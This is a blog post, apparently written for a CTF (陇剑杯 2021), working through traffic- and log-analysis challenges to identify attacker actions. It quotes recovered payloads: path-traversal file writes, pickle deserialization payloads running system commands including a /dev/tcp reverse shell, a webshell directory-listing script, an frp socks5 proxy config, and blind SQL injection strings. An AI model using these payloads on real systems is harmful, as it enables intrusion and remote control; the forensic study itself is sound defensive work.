@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="记录陇剑杯的流量分析题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="陇剑杯 2021">
+<meta property="og:url" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="记录陇剑杯的流量分析题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417174942408.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417175333064.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417181946403.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417182628708.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240418193436502.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240419131922872.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420000538452.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420000759739.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420001432616.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170300952.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170625538.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170723870.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240421170940191.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240421172832871.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/C:/Users/%E7%BD%97%E6%80%9D%E8%BF%9C/AppData/Roaming/Typora/typora-user-images/image-20240421173553044.png">
+<meta property="article:published_time" content="2024-04-19T03:11:09.000Z">
+<meta property="article:modified_time" content="2024-06-23T13:50:50.526Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="NSSCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417174942408.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>陇剑杯 2021 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/%E9%99%87%E5%89%91%E6%9D%AF2021.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          陇剑杯 2021
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-19 11:11:09" itemprop="dateCreated datePublished" datetime="2024-04-19T11:11:09+08:00">2024-04-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-06-23 21:50:50" itemprop="dateModified" datetime="2024-06-23T21:50:50+08:00">2024-06-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">流量分析</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/%E9%99%87%E5%89%91%E6%9D%AF2021.html" class="post-meta-item leancloud_visitors" data-flag-title="陇剑杯 2021" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/%E9%99%87%E5%89%91%E6%9D%AF2021.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/%E9%99%87%E5%89%91%E6%9D%AF2021.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>记录陇剑杯的流量分析题</p>
+<span id="more"></span>
+
+
+
+<h1 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h1><h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>网络存在源码泄漏，源码文件名是什么</strong></p>
+<p>web手都知道的<code>www.zip</code></p>
+<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，文件名为什么</strong></p>
+<p>直接搜索<code>/tmp</code>找到写的文件，url解码一下文件名为<code>sess_car</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>分析攻击流量，黑客使用的是什么类读取了秘密文件。</strong></p>
+<p>前一问已经知道利用的是<code>SplFileObject</code>原生类读取文件</p>
+<h1 id="简单日志分析"><a href="#简单日志分析" class="headerlink" title="简单日志分析"></a>简单日志分析</h1><h2 id="Task1-1"><a href="#Task1-1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客攻击的参数是什么</strong></p>
+<p>打开日志文件看，很明显只有user参数，解码一下发现是pickle反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;whoami&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Task2-1"><a href="#Task2-1" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客查看的秘密文件的绝对路径是什么</strong></p>
+<p>往后看user参数值解码一下就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;cat /Th4s_IS_VERY_Import_Fi1e&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task3-1"><a href="#Task3-1" class="headerlink" title="Task3"></a>Task3</h2><p><strong>黑客反弹shell的ip和端口是什么</strong></p>
+<p>先url解码然后再base64解码即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.197/8888 0&gt;&amp;1&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="Task1-2"><a href="#Task1-2" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客登录系统使用的密码是什么</strong></p>
+<p>追踪tcp流，在第六个流找到密码<code>Admin123@#</code></p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417174942408.png"></p>
+<h2 id="Task2-2"><a href="#Task2-2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客修改了一个日志文件，文件的绝对路径为什么</strong></p>
+<p>在第26个流找到引用<code>21_08_07.log</code>日志文件并命令执行，则该文件被植入木马</p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417175333064.png"></p>
+<p>文件的绝对路径为<code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code></p>
+<h2 id="Task3-2"><a href="#Task3-2" class="headerlink" title="Task3"></a>Task3</h2><p><strong>黑客获取webshell之后，权限是是什么</strong></p>
+<p>我们利用语法，搜索http请求中包含<code>whoami</code>命令执行的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>找到24和28流，其中28流的200响应包中找到用户权限为<code>www-data</code></p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417181946403.png"></p>
+<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>黑客写入的webshell文件名是什么</strong></p>
+<p>在第33个流找到写入木马的命令，文件名为<code>1.php</code></p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417182628708.png"></p>
+<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>黑客上传的代理工具客户端名字是什么</strong></p>
+<p>因为我们知道写马到1.php，我们筛选一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;1.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后一个个看，在第39个流追踪http流，发现代理工具<code>frpc.ini</code></p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240418193436502.png"></p>
+<p>我们分析一下是如何回显上述列表的，将发包数据解码并美化一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">aaa=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">	return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	echo &quot;693&quot;.&quot;d434&quot;;</span><br><span class="line">	echo @asenc($output);</span><br><span class="line">	echo &quot;a3&quot;.&quot;7cb&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">	$D=base64_decode(substr($_POST[&quot;j68071301598f&quot;],2));</span><br><span class="line">	$F=@opendir($D);</span><br><span class="line">	if($F==NULL) &#123;</span><br><span class="line">		echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$M=NULL;</span><br><span class="line">		$L=NULL;</span><br><span class="line">		while($N=@readdir($F)) &#123;</span><br><span class="line">			$P=$D.$N;</span><br><span class="line">			$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));</span><br><span class="line">			@$E=substr(base_convert(@fileperms($P),10,8),-4);</span><br><span class="line">			$R=&quot;	&quot;.$T.&quot;	&quot;.@filesize($P).&quot;	&quot;.$E.&quot;</span><br><span class="line">&quot;;</span><br><span class="line">			if(@is_dir($P))$M.=$N.&quot;/&quot;.$R; else $L.=$N.$R;</span><br><span class="line">		&#125;</span><br><span class="line">		echo $M.$L;</span><br><span class="line">		@closedir($F);</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">	echo &quot;ERROR://&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br><span class="line">&amp;j68071301598f=hML3Zhci93d3cvaHRtbC8=</span><br></pre></td></tr></table></figure>
+
+<p>我们重点看下面函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function asoutput() &#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	echo &quot;693&quot;.&quot;d434&quot;;</span><br><span class="line">	echo @asenc($output);</span><br><span class="line">	echo &quot;a3&quot;.&quot;7cb&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由回显内容可以知道<code>@asenc($output)</code>就是输出的列表，而<code>$output</code>是调用<code>ob_get_contents()</code>，它用于获取当前输出缓冲区的内容并返回。 然后看向try的过程，发现POST参数从第二位开始截取并解码，结果为<code>/var/www/html</code>，那么应该就是读取该路径下的文件。</p>
+<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>黑客代理工具的回连服务端IP是什么</strong></p>
+<p>追踪tcp流，在第38个流找到hex加密数据，解码得到ip为<code>192.168.239.123</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.239.123</span><br><span class="line">server_port = 7778</span><br><span class="line">token=Xa3BJf2l5enmN6Z7A8mv</span><br><span class="line"></span><br><span class="line">[test_sock5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port =8111</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = 0HDFt16cLQJ</span><br><span class="line">plugin_passwd = JTN276Gp</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>黑客的socks5的连接账号、密码是什么</strong></p>
+<p>前一题得到账号和密码<code>0HDFt16cLQJ#JTN276Gp</code></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="Task1-3"><a href="#Task1-3" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客在注入过程中采用的注入手法叫什么</strong></p>
+<p>查看日志的payload，很明显的布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and if(substr(database(),1,1) = &#x27;.&#x27;,1,(select table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Task2-3"><a href="#Task2-3" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客在注入过程中，最终获取flag的数据库名、表名和字段名是什么</strong></p>
+<p>依次查找即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">table_schema=&#x27;sqli&#x27;</span><br><span class="line">table_name=&#x27;flag&#x27;</span><br><span class="line">column=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Task3-3"><a href="#Task3-3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>黑客最后获取到的flag字符串为什么</strong></p>
+<p>把文件内容url解码一下，保存为md文件然后把出现的<code>€</code>去掉，因为UTF-8无法识别</p>
+<p>然后GPT写个脚本，输出每次注入同一位置的最后一行的对应字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 读取文件内容</span><br><span class="line">with open(r&#x27;C:\Users\罗思远\Desktop\流量分析\NSSCTF\SQL注入\out.md&#x27;, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    file_content = file.readlines()</span><br><span class="line"></span><br><span class="line"># 创建字典存储数字和行索引</span><br><span class="line">index_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 遍历每一行</span><br><span class="line">for index, line in enumerate(file_content):</span><br><span class="line">    # 提取数字部分</span><br><span class="line">    num = line.split(&#x27;,&#x27;)[1].strip()</span><br><span class="line"></span><br><span class="line">    # 将数字和行索引存储到字典中</span><br><span class="line">    if num in index_dict:</span><br><span class="line">        index_dict[num].append(index)</span><br><span class="line">    else:</span><br><span class="line">        index_dict[num] = [index]</span><br><span class="line"></span><br><span class="line"># 获取每个数字对应的最后一个行索引</span><br><span class="line">last_indexes = [indexes[-1] for indexes in index_dict.values()]</span><br><span class="line"></span><br><span class="line">results = []</span><br><span class="line">for index in last_indexes:</span><br><span class="line">    line = file_content[index]</span><br><span class="line">    start_quote = line.find(&quot;&#x27;&quot;) + 1</span><br><span class="line">    end_quote = line.find(&quot;&#x27;&quot;, start_quote)</span><br><span class="line">    content = line[start_quote:end_quote]</span><br><span class="line">    results.append(content)</span><br><span class="line"></span><br><span class="line"># 拼接结果</span><br><span class="line">result = &#x27;&#x27;.join(results)</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240419131922872.png"></p>
+<h1 id="ios"><a href="#ios" class="headerlink" title="ios"></a>ios</h1><p><strong>背景</strong></p>
+<blockquote>
+<p>一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答</p>
+</blockquote>
+<h2 id="Task1-4"><a href="#Task1-4" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客所控制的C&amp;C服务器IP是什么</strong></p>
+<p>查看下http流，在第一行也就是第十五个流找到控制ip</p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420000538452.png"></p>
+<h2 id="Task2-4"><a href="#Task2-4" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客利用的Github开源项目的名字是什么</strong></p>
+<p>直接筛选一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;github&quot;</span><br></pre></td></tr></table></figure>
+
+<p>github后面依次是用户和仓库，所以为<code>Stowaway</code></p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420000759739.png"></p>
+<h2 id="Task3-4"><a href="#Task3-4" class="headerlink" title="Task3"></a>Task3</h2><p><strong>通讯加密密钥的明文是什么</strong></p>
+<p>由前面知道开源项目地址，访问一下获得信息<code>-s</code>后的为加密密钥</p>
+<p>所以明文为<code>hack4sec</code></p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420001432616.png"></p>
+<h2 id="Task4-1"><a href="#Task4-1" class="headerlink" title="Task4"></a>Task4</h2><p><strong>黑客通过SQL盲注拿到了一个敏感数据，内容是什么</strong></p>
+<p>查找http流没有收获，结合题目给了私钥文件keylog.txt，那么有部分流量应该是加密过的</p>
+<p><code>编辑 =&gt; 首选项</code>找到Protocols(协议)，点击TLS并导入keylog文件</p>
+<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170300952.png"></p>
